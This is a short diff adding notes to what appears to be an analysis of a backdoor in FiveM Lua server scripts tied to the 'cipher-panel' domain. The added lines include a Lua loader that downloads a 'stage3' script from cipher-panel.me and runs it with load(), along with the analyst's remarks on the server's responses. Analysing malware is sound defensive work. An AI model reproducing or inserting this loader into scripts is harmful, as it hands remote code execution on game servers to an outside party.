@@ -102,3 +102,9 @@ PerformHttpRequest(Func1(), function (e, responseBody)
 	Payload()
 end)
 ```
+Simple CURL request to https://cipher-panel.me/_i/r.php?to=0 (Which is the HEX Array but in plain text), we get a different result.
+
+```
+PerformHttpRequest('https://cipher-panel.me/_i/v2_/stage3?to=0', function (e, d) pcall(function() assert(load(d))() end) end)
+```
+It sends us to this page but not the actual stage3.php, there seems to be a difference in that. 
